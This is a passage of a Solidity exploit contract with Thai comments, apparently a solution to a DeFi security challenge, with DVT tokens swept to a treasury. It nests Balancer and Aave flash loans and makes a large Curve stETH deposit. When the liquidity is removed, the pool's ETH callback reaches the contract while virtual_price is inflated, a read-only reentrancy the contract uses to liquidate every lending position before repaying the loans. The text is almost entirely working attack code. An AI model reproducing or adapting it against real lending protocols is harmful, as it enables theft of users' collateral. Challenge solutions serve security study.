        dvt.transfer(treasury, dvt.balanceOf(address(this)));            // 7500 DVT
        weth.transfer(treasury, weth.balanceOf(address(this)));          // WETH > 0
        IERC20(lpToken).transfer(treasury, IERC20(lpToken).balanceOf(address(this))); // LP > 0
    }

    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
        require(msg.sender == address(balancer), "not balancer");
        // INNER loan: Aave (ทั้งสอง asset), modes [0,0] = คืนเต็มจำนวน
        address[] memory assets = new address[](2);
        uint256[] memory amts = new uint256[](2);
        uint256[] memory modes = new uint256[](2);
        assets[0] = address(weth);  assets[1] = address(wstETH);
        amts[0] = AAVE_WETH;        amts[1] = AAVE_WSTETH;
        (bool ok,) = aavePool.call(abi.encodeWithSignature(
            "flashLoan(address,address[],uint256[],uint256[],address,bytes,uint16)",
            address(this), assets, amts, modes, address(this), bytes(""), uint16(0)));
        require(ok, "aave flashloan failed");
        // คืน Balancer (ไม่มีค่าธรรมเนียม)
        IERC20(address(weth)).transfer(address(balancer), BAL_WETH);
        IERC20(address(wstETH)).transfer(address(balancer), BAL_WSTETH);
    }

    function executeOperation(address[] calldata, uint256[] calldata, uint256[] calldata premiums,
        address initiator, bytes calldata) external returns (bool) {
        require(msg.sender == aavePool && initiator == address(this));
        // 1) แปลง token ที่กู้มาทั้งหมด -> coin ของ pool (ETH + stETH)
        weth.withdraw(IERC20(address(weth)).balanceOf(address(this)));
        wstETH.unwrap(IERC20(address(wstETH)).balanceOf(address(this)));
        stETH.approve(address(curvePool), type(uint256).max);
        // 2) add liquidity ก้อนใหญ่ (stETH เยอะ)
        uint256 stEthAmount = stETH.balanceOf(address(this));
        uint256 ethForLp = address(this).balance;
        uint256 lpMinted = curvePool.add_liquidity{value: ethForLp}([ethForLp, stEthAmount], 0);
        // 3) ให้ lending ดึง LP ของเราตอน liquidate()
        IERC20(lpToken).approve(address(permit2), type(uint256).max);
        permit2.approve(lpToken, address(lending), type(uint160).max, uint48(block.timestamp + 1));
        // 4) remove -> pool raw-call ส่ง ETH เข้า receive() -> ช่วง liquidate
        state = State.LIQUIDATING;
        curvePool.remove_liquidity(lpMinted, [uint256(0), uint256(0)]);
        state = State.NONE;
        // 5) ใช้หนี้: ETH ส่วนเกิน -> stETH -> wstETH เพื่อชดเชยส่วนที่ขาด
        uint256 wethOwed   = AAVE_WETH + premiums[0] + BAL_WETH;
        uint256 wstethOwed = AAVE_WSTETH + premiums[1] + BAL_WSTETH;
        weth.deposit{value: wethOwed}();
        uint256 ethBal = address(this).balance;
        if (ethBal > ETH_RESERVE) {
            (bool ok,) = address(stETH).call{value: ethBal - ETH_RESERVE}(
                abi.encodeWithSignature("submit(address)", address(0)));
            require(ok, "lido submit failed");
        }
        stETH.approve(address(wstETH), type(uint256).max);
        wstETH.wrap(stETH.balanceOf(address(this)));
        require(IERC20(address(wstETH)).balanceOf(address(this)) >= wstethOwed, "wsteth short");
        IERC20(address(weth)).approve(aavePool, AAVE_WETH + premiums[0]);
        IERC20(address(wstETH)).approve(aavePool, AAVE_WSTETH + premiums[1]);
        return true;
    }

    receive() external payable {
        if (state != State.LIQUIDATING) return;
        // virtual_price ถูกปั่นขึ้นแล้ว (read-only reentrancy) -> liquidate ได้ทุก position
        for (uint256 i = 0; i < users.length; i++) lending.liquidate(users[i]);
    }
}`
